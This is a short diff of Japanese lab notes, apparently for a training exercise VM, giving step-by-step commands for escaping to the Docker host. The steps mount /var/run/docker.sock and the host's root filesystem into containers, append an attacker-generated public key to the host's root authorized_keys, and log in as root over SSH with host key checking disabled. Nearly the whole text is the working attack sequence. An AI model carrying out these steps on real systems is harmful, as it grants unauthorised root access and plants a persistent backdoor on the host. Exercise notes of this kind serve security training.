@@ -1,0 +1,19 @@
+1 /var/run/docker.sock をマウントしたコンテナの作成
+docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker:24.0.6 /bin/sh
+
+2　ホストの　/ をマウントしたコンテナを作成
+docker run --rm -it -v /:/host-root alpine:3.18.3 /bin/sh
+
+
+
+3　個人VMでSSH鍵のペアを作成
+
+ssh-keygen -t rsa
+
+~/.sshにカギができる
+４　2で作成したコンテナ内からホストのauthorized_keysに公開鍵が作成される。
+vi /host-root/root/.ssh/authorized_keys
+3で作成したid_rsa.pubを貼り付け
+
+５　個人VMから公開鍵認証でSSHログイン
+ssh -o StrictHostKeyChecking=off root@<演習VMのIP>
